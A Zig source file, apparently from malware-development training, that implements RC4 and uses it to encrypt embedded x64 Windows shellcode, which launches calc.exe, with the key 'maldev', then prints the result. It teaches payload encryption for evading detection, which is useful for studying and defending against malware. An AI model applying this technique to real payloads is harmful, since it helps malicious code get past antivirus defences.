const std = @import("std");

pub const RC4 = struct {
    state: [256]u8 = undefined,
    i: u8 = 0,
    j: u8 = 0,

    pub fn init(key: []const u8) RC4 {
        var rc4 = RC4{};

        // Initialize state array
        for (0..256) |idx| rc4.state[idx] = @intCast(idx);

        // Key-Scheduling Algorithm (KSA)
        var j: u8 = 0;
        for (0..256) |i| {
            j = j +% rc4.state[i] +% key[i % key.len];
            rc4.swap(@intCast(i), j);
        }

        return rc4;
    }

    pub fn encrypt(rc4: *RC4, dest: []u8, src: []const u8) []u8 {
        std.debug.assert(dest.len >= src.len);

        for (src, 0..) |val, idx| dest[idx] = rc4.nextByte() ^ val;

        return dest[0..src.len];
    }

    pub const decrypt = encrypt;

    fn swap(rc4: *RC4, this: u8, that: u8) void {
        const tmp = rc4.state[this];
        rc4.state[this] = rc4.state[that];
        rc4.state[that] = tmp;
    }

    fn nextByte(rc4: *RC4) u8 {
        rc4.i +%= 1;
        rc4.j +%= rc4.state[rc4.i];
        rc4.swap(rc4.i, rc4.j);
        const t = rc4.state[rc4.i] +% rc4.state[rc4.j];

        return rc4.state[t];
    }
};

pub fn main() !void {
    const shell_code = [_]u8{
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    };
    var buf: [276]u8 = undefined;

    var rc4 = RC4.init("maldev");
    const encrypted_shell_code = rc4.encrypt(&buf, &shell_code);
    std.debug.print("Encrypted shell code: {any}\n", .{encrypted_shell_code});
}
